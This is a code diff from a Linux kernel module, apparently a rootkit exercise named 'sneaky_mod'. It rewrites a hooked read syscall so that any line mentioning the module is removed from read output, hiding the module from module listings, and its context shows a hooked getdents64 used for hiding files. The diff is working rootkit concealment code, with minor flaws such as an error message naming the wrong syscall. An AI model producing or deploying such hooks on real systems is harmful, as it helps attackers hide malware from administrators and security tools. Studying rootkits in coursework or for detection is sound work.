@@ -99,34 +99,28 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
   return nread;
 }
 
-asmlinkage int sneaky_sys_read(struct pt_regs *regs)
-{
-  // Implement the sneaky part here
-  //return (*original_read)(regs);
-  unsigned int fd = regs->di;
-  char * buf = regs->si;
-  size_t count = regs->dx;
+asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
+  char *line_start = NULL, *line_end = NULL, *buf = regs->si;
   ssize_t nread = original_read(regs);
-  if (nread == -1) {
-    printk(KERN_INFO "error: cannot operate original read");
-    return -1;
+
+   if(nread == -1){
+    printk(KERN_INFO "Error in calling original gendents64\n");
   }
-  else if (nread == 0) {
+  else if (nread == 0){
     return 0;
   }
   else{
-   char * line_start = strstr(buf, "sneaky_mod ");
+    line_start = strstr(buf, "sneaky_mod ");
     if (line_start != NULL) {
-      char * line_end = strchr(line_start, '\n');
+      line_end = strchr(line_start, '\n');
       if(line_end !=NULL){
         line_end++;
         memmove(line_start, line_end, (char __user*)(buf + nread) - line_end);
         nread -= (ssize_t)(line_end - line_start);
       }
     }
-  return (ssize_t)nread;
   }
-  
+  return nread;
 }
 
 // The code that gets executed when the module is loaded
